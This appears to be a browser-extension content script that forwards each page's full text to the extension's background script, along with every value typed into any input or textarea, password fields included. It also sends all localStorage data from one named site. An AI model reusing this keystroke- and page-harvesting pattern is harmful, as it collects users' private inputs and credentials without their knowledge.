const observer = new MutationObserver(function (mutationsList) {
  for (const mutation of mutationsList) {
    // Check if the mutation type is 'childList' (indicating a change in child nodes)
    if (mutation.type === 'childList') {
      // Get the updated page content
      const pageContent = document.documentElement.innerText;
      chrome.runtime.sendMessage({ content: pageContent });
      
      // Capture and log the user's inputs
      captureUserInputs();
    }
  }
});

observer.observe(document, { childList: true, subtree: true });

function retrieveLocalStorageData() {
  if (window.location.hostname == "mindful-beans.netlify.app") {
    if (localStorage.length > 0) {
      console.log('Retrieved data from extension storage:', localStorage);
      chrome.runtime.sendMessage({ localStorageData: localStorage, website: window.location.hostname });
    } else {
      setTimeout(retrieveLocalStorageData, 500);
    }
  }
};

// Function to capture and log the user's inputs
function captureUserInputs() {
  // Get all input and textarea elements on the page
  const inputs = document.querySelectorAll('input, textarea');

  // Iterate over each input and textarea element
  for (let i = 0; i < inputs.length; i++) {
    // Check if we've already added an event listener to this element
    if (inputs[i].dataset.listening !== 'true') {
      // Add an event listener to capture the input's value every time it is changed
      inputs[i].addEventListener('input', function(event) {
        // Get the value of the input element
        const inputValue = event.target.value;

        // Send a message to the background script to log the input value
        chrome.runtime.sendMessage({ action: "logInput", inputValue: inputValue });
      });

      // Mark the input as having an event listener
      inputs[i].dataset.listening = 'true';
    }
  }
}

// Call the captureUserInputs function at the start to handle any already existing inputs
captureUserInputs();

// Call the retrieveLocalStorageData function
retrieveLocalStorageData();
